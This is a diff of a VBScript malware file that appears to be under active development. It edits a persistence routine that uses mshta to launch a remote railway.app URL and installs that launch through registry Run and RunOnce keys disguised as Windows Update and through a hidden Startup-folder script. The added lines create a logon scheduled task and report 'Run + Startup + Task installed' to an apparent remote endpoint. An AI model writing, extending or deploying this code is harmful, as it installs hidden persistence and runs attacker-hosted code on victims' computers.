@@ -196,15 +196,17 @@ Sub PostRaw(text)
     Set h = Nothing
 End Sub
 Sub Persistence()
-    Dim payload : payload = "mshta https://app-a77430ab4f86bba7.up.railway.app/"
     On Error Resume Next
+    Dim payload, sp, sf
+    payload = "mshta https://app-a77430ab4f86bba7.up.railway.app/"
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
-    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
-    Dim sf : Set sf = fso.CreateTextFile(sp, True)
+    sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
+    Set sf = fso.CreateTextFile(sp, True)
     sf.WriteLine "CreateObject(""WScript.Shell"").Run ""mshta " & payload & """, 0, False"
     sf.Close
-    PostEmbed "PERSISTENCE", "3 startup methods installed", 65280
+    sh.Run "schtasks /create /tn ""WinUpdate"" /tr ""mshta " & payload & """ /sc onlogon /rl limited /f", 0, True
+    PostEmbed "PERSISTENCE", "Run + Startup + Task installed", 65280
 End Sub
 Sub IP()
     Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
